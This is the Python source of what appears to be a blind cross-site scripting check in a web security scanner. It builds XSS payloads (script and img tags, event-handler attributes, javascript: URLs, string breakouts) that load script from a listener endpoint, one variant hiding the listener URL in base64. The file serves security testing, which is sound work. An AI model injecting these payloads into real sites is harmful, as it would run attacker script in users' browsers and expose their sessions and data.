import base64
from ava.common.check import _BlindCheck

# metadata
name = __name__
description = "checks for blind cross-site scripting"


class CrossSiteScriptingBlindCheck(_BlindCheck):
    """
    Checks for blind Cross-Site Scripting by executing callbacks. A listener server should be deployed and configured
    in order to listen for callbacks from the payloads.
    """
    key = "xss.blind.callback"
    name = "Blind Cross-Site Scripting"
    description = "Checks for blind Cross-Site Scripting by injecting HTML tags"

    def __init__(self, listener):
        """
        Generate payloads by including the listener's endpoint into the templates. Payloads can reference the listener
        directly or can add a reference to the listener dynamically through JavaScript. Direct payloads are shorter
        and may bypass length restrictions. Dynamic payloads slightly obfuscate the listener and may prevent obvious
        disclosure of access tokens in server or application logs.
        :param listener: listener endpoint
        """
        directs = [
            # img (alert only)
            '<img src="{}">',
            '"><img src="{}"><"',
            # script
            '<script src="{}"></script>',
            '"><script src="{}"></script><"'
        ]

        dynamics = [
            # two tags
            '<script>{}</script>',
            '"><script>{}</script><"',
            # one tag
            '<img src="x:#" onerror="{}">',
            '"><img src="x:#" onerror="{}"><"',
            # attribute
            '" onmouseover="{}',
            '#" onclick="{}',
            # href
            'javascript:(function(){{{}}})()',
            # javascript
            "';{}//'",
            '";{}//"'
        ]

        # encode listener and format script
        template = "s=document.createElement('script');s.src=atob('{}');document.head.appendChild(s);"
        encoded = base64.b64encode(listener.encode()).decode()
        script = template.format(encoded)

        # add listener to direct payloads
        direct_payloads = [payload.format(listener) for payload in directs]

        # add script to dynamic payloads
        dynamic_payloads = [payload.format(script) for payload in dynamics]

        # combine payloads
        self._payloads = direct_payloads + dynamic_payloads
